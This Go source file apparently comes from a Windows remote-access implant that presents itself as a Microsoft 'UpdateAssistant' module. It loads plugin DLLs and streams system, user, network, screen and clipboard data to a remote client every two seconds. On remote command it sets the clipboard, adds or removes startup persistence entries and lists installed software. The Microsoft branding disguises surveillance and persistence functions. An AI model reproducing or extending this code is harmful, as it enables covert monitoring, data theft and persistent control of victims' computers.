//go:build windows

package system

import (
	"encoding/json"
	"sync"
	"time"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

type dlls struct {
	cpu      *loader.Plugin
	ram      *loader.Plugin
	disk     *loader.Plugin
	osinfo   *loader.Plugin
	netinfo  *loader.Plugin
	userinfo *loader.Plugin
	screen   *loader.Plugin
	clip     *loader.Plugin
	startup  *loader.Plugin
	software *loader.Plugin
}

func (d *dlls) load() bool {
	names := []struct {
		ptr  **loader.Plugin
		name string
	}{
		{&d.cpu, "cpu"}, {&d.ram, "ram"}, {&d.disk, "disk"},
		{&d.osinfo, "osinfo"}, {&d.netinfo, "netinfo"}, {&d.userinfo, "userinfo"},
		{&d.screen, "screen"}, {&d.clip, "clipboard"},
		{&d.startup, "startup"}, {&d.software, "software"},
	}
	for _, n := range names {
		var err error
		*n.ptr, err = loader.Load(n.name)
		if err != nil {
			logger.Info("[system] failed to load %s: %v", n.name, err)
			d.unload()
			return false
		}
	}
	return true
}

func (d *dlls) unload() {
	for _, p := range []*loader.Plugin{d.cpu, d.ram, d.disk, d.osinfo, d.netinfo, d.userinfo, d.screen, d.clip, d.startup, d.software} {
		loader.Unload(p)
	}
}

type session struct {
	client *transport.Client
	d      *dlls
	stop   chan struct{}
	wg     sync.WaitGroup
}

var (
	sessMu  sync.Mutex
	current *session
)

func Open(client *transport.Client) {
	sessMu.Lock()
	if current != nil {
		sessMu.Unlock()
		logger.Info("[system] Open called but already open")
		return
	}
	d := &dlls{}
	if !d.load() {
		sessMu.Unlock()
		logger.Info("[system] Open: dll load failed")
		return
	}
	s := &session{client: client, d: d, stop: make(chan struct{})}
	current = s
	sessMu.Unlock()

	logger.Info("[system] Open: starting goroutines")
	s.wg.Add(2)
	go func() { defer s.wg.Done(); sendStatic(s) }()
	go func() { defer s.wg.Done(); sendLive(s) }()

	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-s.stop:
				return
			case <-t.C:
				sendLive(s)
			}
		}
	}()

	s.wg.Add(1)
	go watchStartup(s)

	s.wg.Add(1)
	go watchClipboard(s)
}

func Close() {
	sessMu.Lock()
	s := current
	current = nil
	sessMu.Unlock()
	if s == nil {
		return
	}
	close(s.stop)
	s.wg.Wait()
	s.d.unload()
	logger.Info("[system] closed, all DLLs unloaded")
}

func Handle(client *transport.Client, msgType string, payload json.RawMessage) {
	sessMu.Lock()
	s := current
	sessMu.Unlock()
	if s == nil {
		return
	}
	switch msgType {
	case "system_refresh":
		go sendStatic(s)
		go sendLive(s)
		go sendClipboard(s)
		go sendStartup(s)
	case "system_export":
		go sendExport(s)
	case "system_clipboard_get":
		go sendClipboard(s)
	case "system_clipboard_set":
		var p struct{ Text string `json:"text"` }
		if json.Unmarshal(payload, &p) == nil {
			go func() {
				s.d.clip.Call("clipboard_set",
					uintptr(unsafe.Pointer(loader.BytePtr(p.Text))),
					uintptr(len(p.Text)),
				)
			}()
		}
	case "system_startup_list":
		go sendStartup(s)
	case "system_startup_add":
		var p struct {
			Name    string   `json:"name"`
			Path    string   `json:"path"`
			Methods []string `json:"methods"`
		}
		if json.Unmarshal(payload, &p) != nil || p.Name == "" || p.Path == "" {
			return
		}
		if len(p.Methods) == 0 {
			p.Methods = []string{"reg"}
		}
		go handleStartupAdd(s, p)
	case "system_startup_remove":
		var p struct{ Name string `json:"name"` }
		if json.Unmarshal(payload, &p) == nil && p.Name != "" {
			go handleStartupRemove(s, p.Name)
		}
	case "system_software_list":
		go sendSoftware(s)
	}
}

func pStr(p *loader.Plugin, export string) string {
	buf := make([]byte, config.SmallBuf)
	n, err := p.Call(export, uintptr(unsafe.Pointer(&buf[0])), uintptr(config.SmallBuf))
	if err != nil || int(n) == 0 {
		return ""
	}
	return string(buf[:int(n)])
}

func pNum(p *loader.Plugin, export string) int {
	r, _ := p.Call(export)
	return int(r)
}

func pU64(p *loader.Plugin, export string) uint64 {
	r, _ := p.Call(export)
	return uint64(r)
}

func splitLines(s string) []string {
	var out []string
	start := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\n' {
			if i > start {
				out = append(out, s[start:i])
			}
			start = i + 1
		}
	}
	return out
}

func splitTab(s string) []string {
	for i := 0; i < len(s); i++ {
		if s[i] == '\t' {
			return []string{s[:i], s[i+1:]}
		}
	}
	return []string{s}
}